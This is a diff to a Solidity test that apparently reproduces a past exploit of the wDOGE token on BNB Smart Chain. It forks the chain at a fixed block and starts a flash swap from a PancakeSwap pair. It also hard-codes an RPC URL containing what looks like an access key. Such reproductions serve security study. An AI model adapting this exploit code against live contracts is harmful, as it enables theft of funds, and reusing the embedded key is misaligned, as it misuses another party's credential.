@@ -11,7 +11,13 @@ contract ContractTest is DSTest {
     IERC20 wdoge  = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
     address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
     address public  BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
-
+    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    uint256 mainnetFork;
+    
+    function setUp() public {
+        mainnetFork = cheats.createFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 17248705); //fork bsc at block 17248705
+        cheats.selectFork(mainnetFork);
+    }
     function  testExploit() public {
         IPancakePair(BUSDT_WBNB_Pair).swap(0,2900 ether, address(this), '0x');
     }
